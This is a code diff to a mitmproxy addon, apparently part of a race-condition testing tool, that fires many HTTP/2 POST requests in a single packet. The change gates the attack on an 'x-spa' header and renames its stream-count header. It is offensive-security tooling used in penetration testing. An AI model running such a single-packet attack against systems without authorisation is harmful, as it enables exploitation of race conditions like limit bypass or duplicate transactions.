@@ -18,7 +18,7 @@ class SinglePacketAttackAddonV1:
         self.h2_conn = None
 
     def request(self, flow: mitmproxy.http.HTTPFlow):
-        if flow.is_replay == "request":
+        if flow.is_replay == "request" and flow.request.headers.get('x-spa', '').lower() == 'true':
             self.host = flow.request.host
             self.setup_connection()
             self.perform_attack(flow)
@@ -35,13 +35,13 @@ class SinglePacketAttackAddonV1:
         body = flow.request.content.decode()
         path = flow.request.path
 
-        # Check if the 'try-num' header is present. If not defaults to 50
-        try_num = int(flow.request.headers.get('try-num', '50'))
+        # Check if the 'x-spa-num' header is present. If not defaults to 20
+        x_spa_num = int(flow.request.headers.get('x-spa-num', '20'))
 
-        stream_ids_list = self.h2_conn.generate_stream_ids(number_of_streams=try_num)
+        stream_ids_list = self.h2_conn.generate_stream_ids(number_of_streams=x_spa_num)
         all_headers_frames = []
         all_data_frames = []
-        for i in range(try_num):
+        for i in range(x_spa_num):
             header_frames_without_last_byte, last_data_frame_with_last_byte = self.h2_conn.create_single_packet_http2_post_request_frames(
                 method='POST',
                 headers_string=headers,
@@ -65,7 +65,7 @@ class SinglePacketAttackAddonV1:
         # Count successful responses
         success_count = sum(1 for frame in resp if frame.startswith(b'\x00\x00\x00\x01'))
 
-        ctx.log.info(f"Attack completed for {self.host}{path}. Successful responses: {success_count}/{try_num}")
+        ctx.log.info(f"Attack completed for {self.host}{path}. Successful responses: {success_count}/{x_spa_num}")
 
     def format_headers(self, headers):
         return "\n".join(f"{k}: {v}" for k, v in headers.items())
